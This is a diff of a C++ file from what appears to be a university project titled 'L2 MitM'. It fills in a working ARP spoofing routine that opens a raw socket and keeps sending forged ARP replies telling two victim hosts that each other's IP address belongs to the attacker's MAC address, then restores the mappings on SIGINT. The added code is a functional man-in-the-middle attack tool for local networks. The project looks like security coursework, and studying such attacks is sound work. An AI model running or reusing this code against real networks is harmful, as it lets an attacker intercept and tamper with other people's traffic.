@@ -1,6 +1,9 @@
 // Projekt: PDS - L2 MitM
 // Autor:   Daniel Klimaj; xklima22@stud.fit.vutbr.cz
 
+#include <csignal>
+#include <unistd.h>
+
 #include "types.h"
 #include "netitf.h"
 #include "arppkt.h"
@@ -16,7 +19,9 @@ using namespace std;
 bool do_spoofing = true;
 
 void print_usage();
-bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1, MACAddr *m2);
+void on_sigint(int signum);
+bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1,
+    MACAddr *m2, uint interval);
 bool spoof_ndp(NetItf *itf, IPv6Addr *ip1, IPv6Addr *ip2, MACAddr *m1, MACAddr *m2);
 
 int main(int argc, char **argv)
@@ -25,6 +30,8 @@ int main(int argc, char **argv)
     StrVect args;
     for(int i=0; i<argc; ++i)
         args.push_back(string(argv[i]));
+
+    signal(SIGINT, on_sigint);
 
     string interface   = "";
     string interval    = "";
@@ -163,7 +170,7 @@ int main(int argc, char **argv)
     {
         if(protocol == "arp")
         {
-            if(!spoof_arp(netitf, v1ip4, v2ip4, v1maca, v2maca))
+            if(!spoof_arp(netitf, v1ip4, v2ip4, v1maca, v2maca, tm_interval))
                 cerr << "ARP spoof failed" << endl;
         }
         else
@@ -190,15 +197,66 @@ void print_usage()
         "ipaddress -victim2mac macaddress" << endl;
 }
 
-bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1, MACAddr *m2)
+///
+/// \brief SIGINT handler
+/// \param signum
+///
+void on_sigint(int signum)
 {
-    cout << "ARP spoof" << endl;
-    (void) itf;
-    (void) ip1;
-    (void) ip2;
-    (void) m1;
-    (void) m2;
-    return false;
+    cout << " SIGINT(" << signum << ") detected" << endl;
+    do_spoofing = false;
+}
+
+bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1,
+MACAddr *m2, uint interval)
+{
+    Socket s(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if(s.open() != SocketStatus::Opened)
+    {
+        cerr << "Failed to open socket for ARP spoofing" << endl;
+        return false;
+    }
+
+    MACAddr     *loc_mac  = itf->mac();
+    ArpPkt      *arppkt1  = new ArpPkt(ArpType::Response, ip2, loc_mac); // pre V1
+    ArpPkt      *arppkt2  = new ArpPkt(ArpType::Response, ip1, loc_mac); // pre V2
+    sockaddr_ll  saddr_v4 = arppkt1->sock_addr(itf->index());
+    uchar       *data1    = nullptr;
+    uchar       *data2    = nullptr;
+
+    arppkt1->set_dst_hwa(m1);
+    arppkt1->set_dst_ip_addr(ip1);
+    arppkt2->set_dst_hwa(m2);
+    arppkt2->set_dst_ip_addr(ip2);
+    data1 = arppkt1->serialize();
+    data2 = arppkt2->serialize();
+
+    while(do_spoofing)
+    {
+        cout << "Sending ARP packets" << endl;
+        s.send_to(data1, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
+            sizeof(saddr_v4));
+        s.send_to(data2, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
+            sizeof(saddr_v4));
+        usleep(interval * 1000);
+    }
+
+    arppkt1->set_src_hwa(m2);
+    arppkt2->set_src_hwa(m1);
+    data1 = arppkt1->serialize();
+    data2 = arppkt2->serialize();
+
+    // Obnova povodneho stavu
+    cout << "Restoring previous ARP status" << endl;
+    s.send_to(data1, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
+        sizeof(saddr_v4));
+    s.send_to(data2, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
+        sizeof(saddr_v4));
+
+    s.close();
+    delete arppkt1;
+    delete arppkt2;
+    return true;
 }
 
 bool spoof_ndp(NetItf *itf, IPv6Addr *ip1, IPv6Addr *ip2, MACAddr *m1, MACAddr *m2)
